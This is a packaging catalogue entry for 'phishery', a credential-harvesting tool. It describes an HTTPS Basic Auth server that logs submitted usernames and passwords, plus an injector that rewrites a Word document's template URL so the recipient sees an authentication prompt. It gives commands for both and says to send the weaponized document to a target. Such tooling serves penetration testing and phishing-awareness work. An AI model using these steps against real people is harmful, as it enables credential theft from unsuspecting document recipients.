---
name: "phishery"
categories:
  - blackarch-backdoor
version: "14.5743953"
homepage: "https://github.com/ryhanson/phishery"
packaged-by: [blackarch]
blackarch-builddate: "2019-05-04"
build-system: go
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "ryhanson/phishery"
github-stars: 1022
github-pushed: "2017-09-11"
github-archived: false
github-issues: 8
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.0
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# phishery

> SSL-enabled Basic Auth credential harvester paired with a Word document template injector — a .docx that pops an authentication dialog against the attacker's URL.

## What it's for

Harvesting credentials through Basic Authentication dialogs over HTTPS, with Microsoft Word as the trigger. Two halves: an HTTP server with SSL that answers requests with a Basic Auth realm (e.g. "Secure Document Gateway"), logs every submitted username/password with remote IP and user agent, and serves a response file; and an injector that rewrites any .docx's template URL to point at that server, so opening the document in Word silently fetches the "template" and shows the user an authentication dialog — a prompt users are trained to trust. Effectiveness depends mostly on the domain and realm text, and a trusted certificate matters: Word on macOS suppresses the dialog over an invalid cert. It is a credential harvester, not a phishing-site cloner — it captures only what users type into the dialog.

## Typical use cases

### Start the harvesting server

```
phishery -s settings.json -c credentials.json
```

Outcome: starts the HTTPS server as configured in `settings.json` (defaults: `0.0.0.0:443`, `server.crt`/`server.key`, realm `Secure Document Gateway`, responding 200 with `template.dotx` after auth). Every credential submitted is printed with timestamp, user agent and source IP, and appended to `credentials.json`. Adjust `ip`, `port`, `basicRealm`, `responseStatus`, and either `responseFile` or a static `responseBody` in the settings file.

### Weaponize a Word document with the phishery URL

```
phishery -u https://secure.example.com/docs -i report.docx -o report-final.docx
```

Outcome: writes `report-final.docx` with its template reference set to the phishery URL (upstream prints the open/set/save steps for confirmation). Send it to a target; when opened in Microsoft Word, the document contacts your server and the recipient sees the Basic Auth dialog. Credentials they enter land in the running server's credential store.

*No corpus evidence — derived from upstream documentation.*
